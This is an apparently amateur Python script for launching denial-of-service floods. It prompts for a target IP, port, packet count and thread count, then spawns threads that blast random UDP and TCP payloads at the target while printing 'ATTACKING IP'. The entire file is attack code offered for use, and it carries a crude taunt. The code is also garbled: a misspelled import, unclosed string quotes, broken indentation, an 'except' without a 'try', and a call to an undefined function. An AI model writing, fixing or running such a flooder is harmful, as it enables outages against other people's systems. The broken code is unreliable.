#No Hastag 
import random
import socket 
import threanding 
import os
import sys
import struct
import time
import codecs

ip = str(input("\033[91mIp:"))
port = int(input("\033[92mPort:"))
choice = str(input("\033[93m(y/n:"))
times = int(input(\033[94mPackets:"))
threads = int(input(\033[95mThreads:"))
os.system("clear")

 def  type(s): 
         for c in s  +  '\n' : 
               sys.stdout.write( c ) 
               sys.stdout.flush( ) 
               time.sleep(0.0010) 
 
 
 type("""\033[81mLo Tau Kontol? """)
 
def run(): 
         data = random._urandom(1460) 
         i = random.choice(("[*]","[!]","[#]"))
 
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
                         addr = (str(ip),int(port)) 
                         for x in range(times): 
                                 s.sendto(data,addr) 
                         print("\u001b[31m[!] ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port)) 
                 except: 
                         print("\u001b[31m[×] ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port)) 
  
  
 def ddos2(): 
         data = random._urandom(666) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print("\u001b[31m[!] ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port)) 
                 except: 
                         s.close() 
                         print("\u001b[31m[×] ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port)) 
  
  
 def ddos3(): 
         data = random._urandom(600000) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print("\u001b[31m[!] ATTACKING TO\033[92m ====> {}:{} \u001b[31m".format(ip, port)) 
                 except: 
                         s.close() 
                         print("\u001b[31m[×] ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port)) 
  
  
 for y in range(threads): 
         if choice == 'udp': 
                 th = threading.Thread(target = ddos) 
                 th.start() 
                 th = threading.Thread(target = ddos2) 
                 th.start() 
         elif choice == 'tcp': 
                 th = threading.Thread(target = ddos3) 
                 th.start()